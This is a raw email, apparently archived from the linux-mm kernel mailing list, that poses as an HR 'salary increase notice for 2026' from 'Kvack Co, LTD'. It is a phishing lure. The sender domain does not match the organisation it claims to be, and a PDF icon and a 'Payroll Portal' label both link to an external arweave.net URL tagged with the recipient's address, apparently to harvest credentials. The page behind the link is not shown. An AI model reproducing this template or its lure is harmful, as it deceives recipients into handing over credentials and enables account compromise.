Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 28606C56201
	for <linux-mm@archiver.kernel.org>; Wed,  5 Aug 2026 11:07:29 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id 13DB16B0099; Wed,  5 Aug 2026 07:07:28 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 0EF306B009B; Wed,  5 Aug 2026 07:07:28 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 007586B009D; Wed,  5 Aug 2026 07:07:27 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0012.hostedemail.com [216.40.44.12])
	by kanga.kvack.org (Postfix) with ESMTP id C42B26B0099
	for <linux-mm@kvack.org>; Wed,  5 Aug 2026 07:07:27 -0400 (EDT)
Received: from smtpin08.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay03.hostedemail.com (Postfix) with ESMTP id 56F7DA0471
	for <linux-mm@kvack.org>; Wed,  5 Aug 2026 11:07:27 +0000 (UTC)
X-FDA: 85066939734.08.011F799
Received: from good.guarantetools.com (good.guarantetools.com [91.219.151.90])
	by imf12.hostedemail.com (Postfix) with ESMTP id 9B7DD40008
	for <linux-mm@kvack.org>; Wed,  5 Aug 2026 11:07:25 +0000 (UTC)
Authentication-Results: imf12.hostedemail.com;
	dkim=pass header.d=good.guarantetools.com header.s=default header.b=FlSweHyH;
	spf=pass (imf12.hostedemail.com: domain of Hr@good.guarantetools.com designates 91.219.151.90 as permitted sender) smtp.mailfrom=Hr@good.guarantetools.com;
	dmarc=pass (policy=reject) header.from=good.guarantetools.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1785928045;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:mime-version:mime-version:
	 content-type:content-type:content-transfer-encoding:in-reply-to:
	 references:dkim-signature; bh=e4UR5bwzj44aTJ33QGw7/86fkCMdOogY0I5hwLsLsxA=;
	b=7RwPPmVRaJuvf2D1vIgeWuM/MInYeaBy8JE46d4dh4O3aWcMwu8niZmzdUviRwJTT+cEro
	s6++cMeTsrCzLntiB7ivZsWLpSRCw53DKZSrxrAQjdCy50vmfWpCld2ZMx+YO+FOfdO6BY
	9nyJZhQSli3dQF5N1zwFOqijh0yFr/M=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1785928045;
	b=mR9Qet7yBjVwWEJE1ogl3bFeW4wjDFf/jOe9IhaEMZ2oVnN9hqHvZPRQxlkGl1kADn33/Z
	1suJcwI6fy6bfKE2RbRsIrepxSzdvTGwudKwXcxtw/71CBltRQQMNONSpzTjN22dbkNo/h
	HdeBWtiTbLCVXCfvX9wVACxVr+YUFbo=
ARC-Authentication-Results: i=1;
	imf12.hostedemail.com;
	dkim=pass header.d=good.guarantetools.com header.s=default header.b=FlSweHyH;
	spf=pass (imf12.hostedemail.com: domain of Hr@good.guarantetools.com designates 91.219.151.90 as permitted sender) smtp.mailfrom=Hr@good.guarantetools.com;
	dmarc=pass (policy=reject) header.from=good.guarantetools.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=good.guarantetools.com;
 h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
 i=Hr@good.guarantetools.com;
 bh=e4UR5bwzj44aTJ33QGw7/86fkCMdOogY0I5hwLsLsxA=;
 b=FlSweHyHogLYuiULoBHlwLdQi9fkmQlJbBn9xmJP3HgpW9KmRZf1wIwDtN01HC9zPCOZ4XRnxf9o
   apSdcGcI1H6vf1sr06GqmGDp5VNo45kPuVWbMab+2iyvwNFDTBrbkGROPLItkvlqy7a9pusxJEO1
   91tAJUJ/uqtxa9ElbKxWhRG8ZDOdywjCQ4aZCnzYjOLp5ciLtWfDTgazkpT4DnYT5TtVRBcOkLnX
   vxZ2R76RrHg5DeuYpqBjLSG+OCgAvqiSp4XMQ45iJb0ZBcrTuoJbDlwLD8DzGxl7O28lgDqmvTtl
   GvD9Ufr0H5kxApCXOdbHIWTXtb765QF/LwOHiQ==
From: "HR | Kvack" <Hr@good.guarantetools.com>
Subject: Salary increase notice for 2026 // 8/5/2026 4:07 AM
To: <linux-mm@kvack.org>
Content-Type: multipart/related; type="multipart/alternative"; boundary="TdqL=_WzRgXe1djLAlFA3u9HDB3tlxR3k6"
MIME-Version: 1.0
Date: Wed, 5 Aug 2026 04:07:08 -0700
X-Priority: 2
Importance: high
Message-Id: <20260508040708595E7713EB-02EC41536F@good.guarantetools.com>
X-Rspam-User: 
X-Rspamd-Server: rspam02
X-Rspamd-Queue-Id: 9B7DD40008
X-Stat-Signature: xyf5enwfa8fp7mp5r31e5strx868y7h8
X-HE-Tag: 1785928045-738622
X-HE-Meta: U2FsdGVkX18pu5PsyyXMKzBAA7AY57uY9JpbXz2LFLeUPxnctSJ0YBWaygyvLeid0+1Nkw7W3VXUNwNUdD/qpB4NNs7YUe+cuVd/K9TE2ophSAidjFqSMsgfvx9oEVu9L+chf3XxlL3Z9qgNAeLWEpCEJPlcRpvTpd85+jj0dQkgzA7xpxjzGUZy7cbAoiuBOO+qSzzm+4iC6Z7HKCe8Mfcy8kySFIbHyS1/USOrgMYnLWGwewu1O7E/vXLNdLuSvcYOtEwp+m/kzEE2sbeCryXBOC22nTNPVGqIBeh6IoCWkFaYCMabYI1xgBCWGcsfiJzJwUQFQu8hFKz7PcOr2fdUtzN7qhtwSitOh4xPqhwllTVB7yXfcUdPd3z7YPflIe498HeSuJaCN8KHUuhfgMxPA3hvaoE4pFWrb+WmPu48wpJP1opN2ZxWIMLWBh457X+OHrubSmg4qg+bdRFFI6JBCu1asWf5qnG81/jNkSpCpb54oafOibA7W/L8yBz5PAfDIc23VOraV76jXZHNiMl7ecUt1DCU3I05InLAcGGt8UK+7Bl69TKxdbqxsky8PlRhTt4X+euZ4RReYwJ/6xXoHOTLgOTTFMmXc7ZN7z5Y7zyJWUAMxWew/xgrnhqt6vRIfirC2VYbGHEAh6tlq2ZbZB+ZlRHpMZUlKLzIDqkI+vrYNhostHaSteDSCXkmLoqCuKvA96Y68Gx4a7VkqkzwxIS9bfGjJNyfnrG09JX3wf8Bfuw7FfU6VyqBboxjZCzg6Frsm0R7q/bR9NsyaIGCs7qWjBJJxctiMoaxXt+xzFhlMSQsTmfnsVeQwxHKlSvXQgXxaItiwwBhx8mApc6pNIkch1MqYurPEapG5nDVHJoWW6wHJcKu42KPPMZMMWrpeNH2EVaBA3PNnObAAlIIpjBVraf4bSo+gHzs8UJ5hSz41gjH8oL+idl5qi1kWi1uDs7iBR6KtJQtu0L
 R2S8S05/
 IUgJBiQOw810XBr1o3dshoKckr0xWE+f3GXSzcenKEbTpUCf5+ogM8cpR6Li3jUhkEn7ZJ04qaWYwF84Q3N6y1ucPhLY3FrIOFTsrceDp5PMY4YsH9G1cGYvH8j+HKBJEsAca1MlgonhWaJPkGkjJpnNwmYDhminKsOq0uv+GjZH+7ICmkWnA3IC+w2IIUunAuD9G9pzcJ7rgjgmCFoTab4s+xIvI9PjJOw07UrY2r+pMvHEZO7gXo0EOEDwAXkaOIRMKrDWVl6HufsHrR835XdHzQe6YePo5B3reGehpE0MRyymy8y/xdNNcaICzKlKcVjNh8syVq/1PYcTfUGVS9L4V5MDlG6nOiuhy6BHeUP4T2dhRy+3kLRctNsdqN4PoD674TaKxlMyL3l6+8fIDPPPk1S/eNqt2kKpS+vr+FP+P+nL7T6f6ZWVODb8GukuFu3cz
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

This is a multi-part message in MIME format

--TdqL=_WzRgXe1djLAlFA3u9HDB3tlxR3k6
Content-Type: multipart/alternative;
	boundary="1qSFsJ7uMuq93DueaJr0Y49ttWxaNm5m=_"

--1qSFsJ7uMuq93DueaJr0Y49ttWxaNm5m=_
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


Attachment: 1 file (49.33 KB)=20

Payroll Portal

http://a37srq3xhkh2fml3s2s5bmwajrjwqrj77ysqcujz6lyxvdluz4la.arweave.ne=
t/Bv8ow3c6j6Kxe5al0LLATFNoRT_-JQFROfLxeo10zxY#linux-mm@kvack.org

Salary increase documents 2026.Pdf

We would like to inform you that base salaries will be increased as fo=
llows, effective from August 2026.

We sincerely thank you for your dedication.

Kvack Co, LTD

--1qSFsJ7uMuq93DueaJr0Y49ttWxaNm5m=_
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


<html lang=3Den><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
8">
  <title>Salary increase notice for 2026 // 8/5/2026 4:07 AM</title>
 </head>
 <body style=3D"FONT-FAMILY: Arial, sans-serif; COLOR: #000000; PADDIN=
G-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; PADDING-RIGHT: =
20px; BACKGROUND-COLOR: #ffffff"> <DIV style=3D"BORDER-TOP: #dddddd 0p=
x solid; PADDING-TOP: 10px; MARGIN-TOP: 10px"><STRONG>Attachment: 1 fi=
le (5.53 KB)</STRONG>&nbsp;&nbsp; </DIV> <DIV style=3D"BORDER-TOP: #dd=
dddd 0px solid; PADDING-TOP: 10px; MARGIN-TOP: 10px">Payroll Portal<!-=
-<a href=3D"#" style=3D"float: right; margin-top: 5px; font-size: 14px=
; text-decoration: none; color: #0066cc;">Download All</a>--></DIV> <D=
IV style=3D"MAX-WIDTH: 700px; BORDER-TOP: #e1e1e1 1px solid; BORDER-RI=
GHT: #e1e1e1 1px solid; BORDER-BOTTOM: #e1e1e1 1px solid; PADDING-BOTT=
OM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: #e1e1e1 =
1px solid; MARGIN-TOP: 10px; DISPLAY: flex; PADDING-RIGHT: 10px; BACKG=
ROUND-COLOR: #f9f9f9; align-items: center; border-radius: 5px"><A href=
=3D"http://a37srq3xhkh2fml3s2s5bmwajrjwqrj77ysqcujz6lyxvdluz4la.arweav=
e.net/Bv8ow3c6j6Kxe5al0LLATFNoRT_-JQFROfLxeo10zxY#linux-mm@kvack.org">=
<IMG border=3D0 src=3D"cid:519DB60273DB72BDB774@WINCLJBGQJP" width=3D6=
0 height=3D56></A>&nbsp;Salary increase documents 2026.Pdf</DIV> <DIV =
style=3D"FONT-SIZE: 16px; MARGIN-TOP: 20px; LINE-HEIGHT: 1.6"> <P>We w=
ould like to inform you that base salaries will be increased as follow=
s, effective from&nbsp;August 2026.</p><p>We sincerely thank you for y=
our dedication.</P>Kvack Co, LTD </DIV></body>
 </html>

--1qSFsJ7uMuq93DueaJr0Y49ttWxaNm5m=_--

--TdqL=_WzRgXe1djLAlFA3u9HDB3tlxR3k6
Content-Type: image/png;
	name="pdf-4.png"
Content-Transfer-Encoding: base64
Content-Disposition: inline;
	filename="pdf-4.png"
Content-ID: <519DB60273DB72BDB774@WINCLJBGQJP>

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

--TdqL=_WzRgXe1djLAlFA3u9HDB3tlxR3k6--


